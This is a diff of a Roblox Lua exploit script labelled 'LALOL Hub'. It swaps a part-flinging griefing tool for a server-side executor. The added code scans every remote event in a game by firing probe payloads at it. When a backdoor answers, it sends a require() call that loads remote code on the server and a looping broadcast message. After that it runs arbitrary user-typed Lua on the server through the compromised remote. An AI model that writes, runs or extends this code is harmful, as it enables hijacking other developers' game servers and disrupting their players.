@@ -1,22 +1,17 @@
-
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
--- local UserInputService = game:GetService("UserInputService") -- Tidak digunakan
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService") -- Digunakan untuk JSONEncode (walaupun log Discord saya hapus)
 
 local player = Players.LocalPlayer
 
--- ** ⬇️ STATUS FITUR FLYFLING PART ⬇️ **
-local isFlyflingActive = false
-local flyflingConnection = nil
-local isFlyflingRadiusOn = true 
-local isFlyflingSpeedOn = true 
-local isPartFollowActive = false 
-local isScanAnchoredOn = false -- Status untuk scan anchored parts
-local flyflingSpeedMultiplier = 100 -- DIUBAH: Default langsung 100x
-local flyflingRadius = 30 -- DIUBAH: Default langsung 30
+-- Global State untuk Backdoor yang Ditemukan
+local backdoorRemote = nil -- RemoteEvent/RemoteFunction yang ditemukan oleh Scanner
+local isGuiVisible = true -- Status visibilitas GUI
 
--- 🔽 ANIMASI "BY : Xraxor" 🔽
+-- ===================================================================================
+-- 🔽 ANIMASI INTRO (BY : Xraxor) 🔽
+-- ===================================================================================
 do
     local introGui = Instance.new("ScreenGui")
     introGui.Name = "IntroAnimation"
@@ -27,7 +22,7 @@ do
     introLabel.Size = UDim2.new(0, 300, 0, 50)
     introLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
     introLabel.BackgroundTransparency = 1
-    introLabel.Text = "By : Xraxor"
+    introLabel.Text = "LALOL Hub - Executor"
     introLabel.TextColor3 = Color3.fromRGB(40, 40, 40)
     introLabel.TextScaled = true
     introLabel.Font = Enum.Font.GothamBold
@@ -37,7 +32,7 @@ do
     local tweenMove = TweenService:Create(introLabel, tweenInfoMove, {Position = UDim2.new(0.5, -150, 0.42, 0)})
 
     local tweenInfoColor = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
-    local tweenColor = TweenService:Create(introLabel, tweenInfoColor, {TextColor3 = Color3.fromRGB(0, 0, 0)})
+    local tweenColor = TweenService:Create(introLabel, tweenInfoColor, {TextColor3 = Color3.fromRGB(200, 0, 0)}) -- Ubah warna menjadi lebih "LALOL"
 
     tweenMove:Play()
     tweenColor:Play()
@@ -50,63 +45,10 @@ do
     end)
 end
 
+-- ===================================================================================
+-- 🔽 FUNGSI UTILITY GLOBAL (Notifikasi dan Status Tombol) 🔽
+-- ===================================================================================
 
--- 🔽 GUI Utama 🔽
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CoreFeaturesGUI"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
--- Frame utama 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 100) 
-frame.Position = UDim2.new(0.4, -110, 0.5, -50)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = screenGui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 15)
-corner.Parent = frame
-
--- Judul GUI
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 30)
-title.BackgroundTransparency = 1
-title.Text = "CORE FEATURES"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 16
-title.Parent = frame
-
--- ScrollingFrame untuk Daftar Pilihan Fitur
-local featureScrollFrame = Instance.new("ScrollingFrame")
-featureScrollFrame.Name = "FeatureList"
-featureScrollFrame.Size = UDim2.new(1, -20, 1, -40)
-featureScrollFrame.Position = UDim2.new(0.5, -100, 0, 35)
-featureScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-featureScrollFrame.ScrollBarThickness = 6
-featureScrollFrame.BackgroundTransparency = 1
-featureScrollFrame.Parent = frame
-
-local featureListLayout = Instance.new("UIListLayout")
-featureListLayout.Padding = UDim.new(0, 5)
-featureListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-featureListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-featureListLayout.Parent = featureScrollFrame
-
-featureListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    featureScrollFrame.CanvasSize = UDim2.new(0, 0, 0, featureListLayout.AbsoluteContentSize.Y + 10)
-    local newHeight = math.min(featureListLayout.AbsoluteContentSize.Y + 40 + 30, 600)
-    frame.Size = UDim2.new(0, 220, 0, newHeight)
-end)
-
-
--- 🔽 FUNGSI UTILITY GLOBAL 🔽
-
--- FUNGSI BARU: Notifikasi dengan Animasi
 local function showNotification(message)
     local notifGui = Instance.new("ScreenGui")
     notifGui.Name = "Notification"
@@ -128,9 +70,7 @@ local function showNotification(message)
     corner.CornerRadius = UDim.new(0, 8)
     corner.Parent = notifLabel
 
-    -- Animation: Fade In (with background)
-    local fadeIn = TweenService:Create(notifLabel, TweenInfo.new(0.3), {TextTransparency = 0, BackgroundTransparency = 0.2, BackgroundColor3 = Color3.fromRGB(0, 100, 200)})
-    -- Animation: Fade Out (with background fade)
+    local fadeIn = TweenService:Create(notifLabel, TweenInfo.new(0.3), {TextTransparency = 0, BackgroundTransparency = 0.2, BackgroundColor3 = Color3.fromRGB(255, 0, 0)}) -- Warna Merah
     local fadeOut = TweenService:Create(notifLabel, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1})
 
     fadeIn:Play()
@@ -143,309 +83,264 @@ local function showNotification(message)
     end)
 end
 
-local function updateButtonStatus(button, isActive, featureName, isToggle)
+local function updateButtonStatus(button, isActive, featureName)
     if not button or not button.Parent then return end
     local name = featureName or button.Name:gsub("Button", ""):gsub("_", " "):upper()
     
-    if isToggle then 
-        if isActive then
-            button.Text = name .. ": ON"
-            button.BackgroundColor3 = Color3.fromRGB(0, 180, 0) 
-        else
-            button.Text = name .. ": OFF"
-            button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) 
-        end
-    else 
-        if isActive then
-            button.Text = name .. ": ON"
-            button.BackgroundColor3 = Color3.fromRGB(0, 150, 0) 
-        else
-            button.Text = name .. ": OFF"
-            button.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
-        end
-    end
-end
-
-
--- 🔽 FUNGSI FLYFLING PART 🔽
-
-local function doFlyfling()
-    if not isFlyflingActive or not player.Character then return end
-
-    local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
-    if not myRoot then return end
-
-    local myVelocity = myRoot.Velocity
-    local speed = isFlyflingSpeedOn and flyflingSpeedMultiplier or 0
-    local targetParts = {}
-
-    -- Ambil semua part di Workspace
-    for _, obj in ipairs(game.Workspace:GetDescendants()) do
-        -- Cek kriteria: BasePart, bukan Baseplate, bukan bagian karakter/Humanoid
-        if obj:IsA("BasePart") and obj.Name ~= "Baseplate" then
-            -- Lewati jika part tersebut adalah bagian dari karakter pemain lain atau NPC
-            if Players:GetPlayerFromCharacter(obj.Parent) or obj.Parent:FindFirstChildOfClass("Humanoid") then
-                continue
-            end
-            
-            -- ** MODIFIKASI: Mendukung Scan Anchored Parts **
-            -- Lewati part yang ditambatkan (Anchored) KECUALI fitur Scan Anchored diaktifkan
-            if (not isScanAnchoredOn) and obj.Anchored then
-                continue
-            end
-
-            local distance = (myRoot.Position - obj.Position).Magnitude
-            
-            -- Cek Radius
-            if isFlyflingRadiusOn and distance > flyflingRadius then continue end
-            
-            -- Batasi massa part
-            if obj:GetMass() < 1000 then 
-                 table.insert(targetParts, obj)
-            end
-        end
-    end
-
-    -- Terapkan Gaya
-    for _, part in ipairs(targetParts) do
-        local direction = (part.Position - myRoot.Position).Unit
-        local force = direction * part:GetMass() * speed * 10 
-        
-        -- Fling: Dorongan menjauhi pemain (Hanya efektif pada part yang Unanchored)
-        part.Velocity = part.Velocity + (force / part:GetMass())
-        
-        -- Part Follow: Membuat part mengikuti pemain
-        if isPartFollowActive then
-            -- Set kecepatan Part pada sumbu X dan Z agar sama dengan kecepatan pemain
-            part.AssemblyLinearVelocity = Vector3.new(myVelocity.X, part.AssemblyLinearVelocity.Y, myVelocity.Z) 
-        end
-    end
-end
-
-local function toggleFlyfling(button)
-    isFlyflingActive = not isFlyflingActive
-    
-    if isFlyflingActive then
-        updateButtonStatus(button, true, "FLYFLING PART")
-        flyflingConnection = RunService.Heartbeat:Connect(doFlyfling)
-        FlyflingFrame.Visible = true 
-        showNotification("FLYFLING PART AKTIF (Speed: " .. flyflingSpeedMultiplier .. "x, Radius: " .. flyflingRadius .. ")") -- NOTIFIKASI
-        print("Flyfling Part AKTIF.")
+    if isActive then
+        button.Text = name .. ": ON"
+        button.BackgroundColor3 = Color3.fromRGB(0, 180, 0) 
     else
-        updateButtonStatus(button, false, "FLYFLING PART")
-        if flyflingConnection then
-            flyflingConnection:Disconnect()
-            flyflingConnection = nil
-        end
-        FlyflingFrame.Visible = false 
-        showNotification("FLYFLING PART NONAKTIF.") -- NOTIFIKASI
-        print("Flyfling Part NONAKTIF.")
+        button.Text = name .. ": OFF"
+        button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) 
     end
 end
 
+-- ===================================================================================
+-- 🔽 GUI UTAMA (Core Features) 🔽
+-- ===================================================================================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CoreFeaturesGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- 🔽 FUNGSI PEMBUAT TOMBOL FITUR 🔽
+-- Frame utama (Diperbesar untuk Executor)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 480, 0, 350) -- Ukuran diperluas
+frame.Position = UDim2.new(0.5, -240, 0.5, -175)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
 
-local function makeFeatureButton(name, color, callback, parent)
-    local parentContainer = parent or featureScrollFrame
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 15)
+corner.Parent = frame
 
-    local featButton = Instance.new("TextButton")
-    featButton.Name = name:gsub(" ", "") .. "Button"
-    featButton.Size = UDim2.new(0, 180, 0, 40)
-    featButton.BackgroundColor3 = color
-    featButton.Text = name
-    featButton.TextColor3 = Color3.new(1, 1, 1)
-    featButton.Font = Enum.Font.GothamBold
-    featButton.TextSize = 12
-    featButton.Parent = parentContainer
+-- Judul GUI
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "LALOL HUB - CORE EXECUTOR"
+title.TextColor3 = Color3.fromRGB(255, 0, 0) -- Warna Merah
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.Parent = frame
 
-    local featCorner = Instance.new("UICorner")
-    featCorner.CornerRadius = UDim.new(0, 10)
-    featCorner.Parent = featButton
+-- ScrollingFrame untuk Daftar Pilihan Fitur (Diubah menjadi wadah utama)
+local featureContainer = Instance.new("Frame")
+featureContainer.Name = "FeatureContainer"
+featureContainer.Size = UDim2.new(1, -20, 1, -40)
+featureContainer.Position = UDim2.new(0.5, -230, 0, 35)
+featureContainer.BackgroundTransparency = 1
+featureContainer.Parent = frame
 
-    featButton.MouseButton1Click:Connect(function()
-        callback(featButton)
-    end)
-    return featButton
+-- ===================================================================================
+-- 🔽 MODUL EXECUTOR (diadaptasi dari skrip pertama) 🔽
+-- ===================================================================================
+
+local ExecutorBox = Instance.new("TextBox")
+ExecutorBox.Name = "ExecutorBox"
+ExecutorBox.Size = UDim2.new(1, 0, 0, 220)
+ExecutorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ExecutorBox.TextColor3 = Color3.fromRGB(198, 119, 88)
+ExecutorBox.PlaceholderText = "Masukkan kode Lua di sini..."
+ExecutorBox.TextWrapped = true
+ExecutorBox.MultiLine = true
+ExecutorBox.TextSize = 14
+ExecutorBox.Font = Enum.Font.SourceSans
+ExecutorBox.Parent = featureContainer
+
+local execCorner = Instance.new("UICorner")
+execCorner.CornerRadius = UDim.new(0, 10)
+execCorner.Parent = ExecutorBox
+
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Name = "ExecuteButton"
+ExecuteButton.Size = UDim2.new(0.6, 0, 0, 35)
+ExecuteButton.Position = UDim2.new(0, 0, 0, 230)
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+ExecuteButton.Text = "EXECUTE"
+ExecuteButton.TextColor3 = Color3.new(1, 1, 1)
+ExecuteButton.Font = Enum.Font.GothamBold
+ExecuteButton.TextSize = 18
+ExecuteButton.Parent = featureContainer
+
+local ClearButton = Instance.new("TextButton")
+ClearButton.Name = "ClearButton"
+ClearButton.Size = UDim2.new(0.35, 0, 0, 35)
+ClearButton.Position = UDim2.new(0.65, 0, 0, 230)
+ClearButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+ClearButton.Text = "CLEAR"
+ClearButton.TextColor3 = Color3.new(1, 1, 1)
+ClearButton.Font = Enum.Font.GothamBold
+ClearButton.TextSize = 18
+ClearButton.Parent = featureContainer
+
+local ScannerButton = Instance.new("TextButton")
+ScannerButton.Name = "ScannerButton"
+ScannerButton.Size = UDim2.new(1, 0, 0, 35)
+ScannerButton.Position = UDim2.new(0, 0, 0, 275)
+ScannerButton.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
+ScannerButton.Text = "START BACKDOOR SCAN"
+ScannerButton.TextColor3 = Color3.new(0, 0, 0)
+ScannerButton.Font = Enum.Font.GothamBold
+ScannerButton.TextSize = 18
+ScannerButton.Parent = featureContainer
+
+-- ===================================================================================
+-- 🔽 FUNGSI LOGIKA (Eksekusi & Scanner) 🔽
+-- ===================================================================================
+
+local function runRemote(remote, data)
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        -- Untuk RemoteFunction, InvokeServer idealnya dijalankan dalam spawn/pcall
+        spawn(function() 
+            local success, result = pcall(remote.InvokeServer, remote, data)
+            if not success then
+                showNotification("Error InvokeServer: " .. tostring(result))
+            end
+        end)
+    end
 end
 
--- 🔽 PENAMBAHAN TOMBOL KE FEATURE LIST 🔽
-
--- Tombol FLYFLING PART (Tombol Utama)
-local flyflingButton = makeFeatureButton("FLYFLING PART: OFF", Color3.fromRGB(120, 0, 0), toggleFlyfling)
-
--- 🔽 SUBMENU FLYFLING PART (Frame) 🔽
-
-local FlyflingFrame = Instance.new("Frame")
-FlyflingFrame.Name = "FlyflingSettings"
-FlyflingFrame.Size = UDim2.new(1, -20, 0, 310) -- Ukuran disesuaikan
-FlyflingFrame.Position = UDim2.new(0, 10, 0, 0)
-FlyflingFrame.BackgroundTransparency = 1
-FlyflingFrame.Visible = false 
-FlyflingFrame.Parent = featureScrollFrame
-
-local FlyflingLayout = Instance.new("UIListLayout")
-FlyflingLayout.Padding = UDim.new(0, 5)
-FlyflingLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-FlyflingLayout.SortOrder = Enum.SortOrder.LayoutOrder
-FlyflingLayout.Parent = FlyflingFrame
-
--- Tombol PART FOLLOW
-local partFollowButton = makeFeatureButton("PART FOLLOW: OFF", Color3.fromRGB(150, 0, 0), function(button)
-    isPartFollowActive = not isPartFollowActive
-    updateButtonStatus(button, isPartFollowActive, "PART FOLLOW", true)
-    showNotification("PART FOLLOW diatur ke: " .. (isPartFollowActive and "ON" or "OFF")) -- NOTIFIKASI
-end, FlyflingFrame)
-
--- Tombol SCAN ANCHORED
-local scanAnchoredButton = makeFeatureButton("SCAN ANCHORED: OFF", Color3.fromRGB(150, 0, 0), function(button)
-    isScanAnchoredOn = not isScanAnchoredOn
-    updateButtonStatus(button, isScanAnchoredOn, "SCAN ANCHORED", true)
-    showNotification("SCAN ANCHORED diatur ke: " .. (isScanAnchoredOn and "ON" or "OFF")) -- NOTIFIKASI
-end, FlyflingFrame)
-
-
--- Tombol Radius ON/OFF
-local radiusButton = makeFeatureButton("RADIUS ON/OFF", Color3.fromRGB(0, 180, 0), function(button)
-    isFlyflingRadiusOn = not isFlyflingRadiusOn
-    updateButtonStatus(button, isFlyflingRadiusOn, "RADIUS", true)
-    showNotification("RADIUS FLING diatur ke: " .. (isFlyflingRadiusOn and "ON" or "OFF")) -- NOTIFIKASI
-end, FlyflingFrame)
-
--- Input Jumlah Radius
-local radiusInput = Instance.new("TextBox")
-radiusInput.Name = "RadiusInput"
-radiusInput.Size = UDim2.new(0, 180, 0, 40)
-radiusInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-radiusInput.PlaceholderText = "Atur Radius: " .. tostring(flyflingRadius) 
-radiusInput.Text = ""
-radiusInput.TextColor3 = Color3.new(1, 1, 1)
-radiusInput.Font = Enum.Font.Gotham
-radiusInput.TextSize = 12
-radiusInput.Parent = FlyflingFrame
-
-radiusInput.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        local newRadius = tonumber(radiusInput.Text)
-        if newRadius and newRadius >= 0 then
-            flyflingRadius = newRadius
-            radiusInput.PlaceholderText = "Atur Radius: " .. tostring(flyflingRadius)
-            radiusInput.Text = "" 
-            showNotification("Radius diatur ke: " .. tostring(newRadius)) -- NOTIFIKASI
-        else
-            radiusInput.Text = "Invalid Number!"
-            task.wait(1)
-            radiusInput.Text = ""
-        end
+local function executeCode()
+    if not backdoorRemote then
+        showNotification("ERROR: Backdoor belum ditemukan. Jalankan scanner dulu!")
+        return
     end
-end)
 
-
--- Tombol Speed ON/OFF
-local speedToggleButton = makeFeatureButton("SPEED ON/OFF", Color3.fromRGB(0, 180, 0), function(button)
-    isFlyflingSpeedOn = not isFlyflingSpeedOn
-    updateButtonStatus(button, isFlyflingSpeedOn, "SPEED", true)
-    showNotification("SPEED FLING diatur ke: " .. (isFlyflingSpeedOn and "ON" or "OFF")) -- NOTIFIKASI
+    local code = ExecutorBox.Text
     
-    local speedInput = FlyflingFrame:FindFirstChild("SpeedInput")
-    if speedInput then
-        speedInput.PlaceholderText = "Speed: " .. tostring(flyflingSpeedMultiplier)
+    -- Ganti variabel pengganti
+    local finalCode = string.gsub(code, '%%username%%', player.Name)
+    
+    ExecuteButton.Text = "EXECUTING..."
+    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+
+    -- Coba Invoke Protected Backdoor (diadaptasi)
+    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
+    
+    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
+        showNotification("Executing via Protected Backdoor...")
+        spawn(function()
+            local boolValue, variantValue = pcall(protected_backdoor:InvokeServer, protected_backdoor, 'lalol hub execute', finalCode)
+            if variantValue ~= nil and type(variantValue) == "string" then
+                local splited = string.split(variantValue,':')
+                showNotification("Response: " .. splited[#splited])
+            end
+        end)
+    else
+        -- Eksekusi via Backdoor Umum
+        showNotification("Executing via Found Backdoor...")
+        runRemote(backdoorRemote, finalCode)
     end
-end, FlyflingFrame)
 
--- Input Jumlah Speed
-local speedInput = Instance.new("TextBox")
-speedInput.Name = "SpeedInput"
-speedInput.Size = UDim2.new(0, 180, 0, 40)
-speedInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-speedInput.PlaceholderText = "Atur Speed: " .. tostring(flyflingSpeedMultiplier) -- Text diperbarui
-speedInput.Text = ""
-speedInput.TextColor3 = Color3.new(1, 1, 1)
-speedInput.Font = Enum.Font.Gotham
-speedInput.TextSize = 12
-speedInput.Parent = FlyflingFrame
-
-speedInput.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        local newSpeed = tonumber(speedInput.Text)
-        if newSpeed and newSpeed >= 0 then
-            flyflingSpeedMultiplier = newSpeed
-            speedInput.PlaceholderText = "Atur Speed: " .. tostring(flyflingSpeedMultiplier)
-            speedInput.Text = "" 
-            showNotification("Speed diatur ke: " .. tostring(newSpeed) .. "x") -- NOTIFIKASI
-        else
-            speedInput.Text = "Invalid Number!"
-            task.wait(1)
-            speedInput.Text = ""
-        end
-    end
-end)
-
-
--- Button Speed List (Jumlah x)
-local speedListFrame = Instance.new("Frame")
-speedListFrame.Name = "SpeedListFrame"
-speedListFrame.Size = UDim2.new(0, 180, 0, 40) 
-speedListFrame.BackgroundTransparency = 1
-speedListFrame.Parent = FlyflingFrame
-
-local speedListLayout = Instance.new("UIListLayout")
-speedListLayout.Padding = UDim.new(0, 5)
-speedListLayout.FillDirection = Enum.FillDirection.Horizontal
-speedListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-speedListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-speedListLayout.Parent = speedListFrame
-
-local speedOptions = {100, 200, 500, 1000} -- Daftar opsi diperbarui
-
-for i, speedValue in ipairs(speedOptions) do
-    local speedListItem = Instance.new("TextButton")
-    speedListItem.Name = "SpeedList" .. speedValue .. "Button"
-    speedListItem.Size = UDim2.new(1 / #speedOptions, -5, 1, 0) 
-    speedListItem.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    speedListItem.Text = tostring(speedValue) .. "x"
-    speedListItem.TextColor3 = Color3.new(1, 1, 1)
-    speedListItem.Font = Enum.Font.GothamBold
-    speedListItem.TextSize = 10
-    speedListItem.Parent = speedListFrame
-
-    local listItemCorner = Instance.new("UICorner")
-    listItemCorner.CornerRadius = UDim.new(0, 5)
-    listItemCorner.Parent = speedListItem
-
-    speedListItem.MouseButton1Click:Connect(function()
-        flyflingSpeedMultiplier = speedValue
-        speedInput.PlaceholderText = "Atur Speed: " .. tostring(flyflingSpeedMultiplier)
-        speedInput.Text = "" 
-        showNotification("Flyfling Speed diatur ke: " .. tostring(speedValue) .. "x") -- NOTIFIKASI
-        print("Flyfling Speed diatur ke: " .. tostring(speedValue))
-    end)
+    task.wait(0.5)
+    ExecuteButton.Text = "EXECUTED!"
+    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+    task.wait(0.5)
+    ExecuteButton.Text = "EXECUTE"
+    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
 end
 
--- Pastikan FlyflingLayout dan featureListLayout diperbarui
-FlyflingLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    FlyflingFrame.Size = UDim2.new(1, -20, 0, FlyflingLayout.AbsoluteContentSize.Y + 10)
-    featureListLayout.AbsoluteContentSize = featureListLayout.AbsoluteContentSize 
-end)
+local function generateName(length)
+    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
+    local text = ''
+    for i=1, length do
+        text = text .. alphabet[math.random(1,#alphabet)]
+    end
+    return text
+end
 
+local function findRemote()
+    if ScannerButton.Text == "SCANNING..." then return end -- Mencegah double click
+    
+    ScannerButton.Text = "SCANNING..."
+    ScannerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0) -- Orange
+    
+    local remotes = {}
+    local timee = os.clock()
+    local found = false
 
--- 🔽 LOGIKA CHARACTER ADDED (PENTING UNTUK MEMPERTAHANKAN STATUS) 🔽
-player.CharacterAdded:Connect(function(char)
-    -- Pertahankan status Flyfling Part
-    if isFlyflingActive then
-        local button = featureScrollFrame:FindFirstChild("FlyflingPartButton")
-        if button then 
-            if not flyflingConnection then
-                flyflingConnection = RunService.Heartbeat:Connect(doFlyfling)
+    -- Logika Scanner (Diadaptasi dari skrip pertama, tanpa Discord Log)
+    for _, remote in game:GetDescendants() do
+        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+            -- Filter keamanan
+            if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' or 
+               (remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents') or 
+               (remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient') or
+               remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
+                continue -- Lewati remote yang dianggap aman
+            end
+
+            -- Kirim payload untuk pengetesan backdoor
+            local code = generateName(math.random(12,30))
+            remotes[code] = remote
+            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+        end
+    end
+
+    -- Checker (Looping Cepat)
+    for i=1, 50 do
+        for code, remote in remotes do
+            if workspace:FindFirstChild(code) then
+                showNotification('Backdoor found! ' .. string.format("%.2f", os.clock() - timee) .. 's')
+                backdoorRemote = remote
+                ScannerButton.Text = "BACKDOOR FOUND: " .. remote.Name
+                ScannerButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0) -- Hijau
+                
+                -- Kirim payload untuk inisialisasi backdoor (diadaptasi)
+                runRemote(remote, "require(171016405.1884*69)")			
+                runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+                
+                found = true
+                break
             end
         end
+        if found then break end
+        task.wait(0.1)
+    end
+
+    if not found then
+        showNotification("Scanner selesai. Tidak ada backdoor yang terdeteksi.")
+        ScannerButton.Text = "NO BACKDOOR FOUND :("
+        ScannerButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+        task.wait(1)
+        ScannerButton.Text = "START BACKDOOR SCAN"
+        ScannerButton.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
+    end
+end
+
+
+-- ===================================================================================
+-- 🔽 KONEKSI EVENT 🔽
+-- ===================================================================================
+
+ExecuteButton.MouseButton1Click:Connect(executeCode)
+
+ClearButton.MouseButton1Click:Connect(function()
+    ExecutorBox.Text = ''
+    ClearButton.Text = 'CLEARED!'
+    ClearButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    task.wait(0.5)
+    ClearButton.Text = 'CLEAR'
+    ClearButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+end)
+
+ScannerButton.MouseButton1Click:Connect(findRemote)
+
+-- Toggle Visibility
+UserInputService.InputBegan:Connect(function(input, processed)
+    if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
+        isGuiVisible = not isGuiVisible
+        frame.Visible = isGuiVisible
     end
 end)
 
-
--- Atur status awal tombol
-updateButtonStatus(flyflingButton, isFlyflingActive, "FLYFLING PART")
-updateButtonStatus(partFollowButton, isPartFollowActive, "PART FOLLOW", true)
-updateButtonStatus(scanAnchoredButton, isScanAnchoredOn, "SCAN ANCHORED", true)
-updateButtonStatus(radiusButton, isFlyflingRadiusOn, "RADIUS", true)
-updateButtonStatus(speedToggleButton, isFlyflingSpeedOn, "SPEED", true)
+-- *Note: Fungsi makeFeatureButton dan updateButtonStatus tidak digunakan dalam kode ini
+-- karena GUI diubah menjadi fokus tunggal Executor. Anda dapat menggunakannya jika
+-- ingin menambahkan tab atau tombol fitur lain di masa depan.
